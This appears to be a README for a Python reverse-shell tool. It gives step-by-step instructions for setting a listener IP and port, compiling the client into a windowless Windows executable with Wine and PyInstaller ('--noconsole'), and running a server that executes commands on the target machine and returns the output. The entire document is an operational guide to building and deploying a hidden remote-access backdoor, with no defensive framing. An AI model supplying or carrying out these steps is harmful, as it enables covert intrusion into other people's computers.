0. Choose IP and port of your server pc, which will listen to connections
// Specify it in ip_cred.py

0*
// I use kali linux pc ('uname -a'):
Linux kali-host 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU/Linux


1. How to compile .py into .exe for Windows environment

// install wine to compile a reverse shell into windows exe program
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install wine32

// download python 2.7 for windows environment choosing "Windows x86 MSI installer"
https://www.python.org/downloads/release/python-2714/

// Go to directory with downloaded python and "wine" it
wine msiexec /i python-2.7.14.msi

// After wine you ll have a directory /root/.wine or /home/<username>/.wine with windows enviroment and Python2 installed

// Install Pyinstaller library (if you get error, it might be because of python2 syntax error, so downgrade version of Pyinstaller).
// In case of errors upgrade pip first for python2
wine /home/<username>/.wine/drive_c/Python27/python.exe -m pip install pip==18     

// I succeeded with pyinstaller==3.2 or 3.1
wine /home/<username>/.wine/drive_c/Python27/python.exe -m pip install pyinstaller==3.2 

// Compile reverse_shell.py into windows exe programm
// There is one more file "ip_cred.py" where you should specify IP of your server machine and port
wine /home/<username>/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole reverse_shell.py

// exe file is in dist directory

2. How to use programs

// Make file server.py executable
chmod +x server.py

// Specify IP and PORT of your server machine in file ip_cred.py

// Run server.py with python (python2 runs well)
./server.py

// If you use linux as client, run reverse_shell.py with IP, PORT from ip_cred.py on linux machine: 
./reverse_shell.py 

//If client is Windows machine:
// Save reverse_shell.exe to Windows machine (the exe file is in /dist directory)
// Run the file on windows pc
// The connection shoud be established
// Input windows commands in server.py prog. It will execute command on windows pc and get you the result of the command back

// Print q to exit server program. It will automatically quit reverse_shell too.
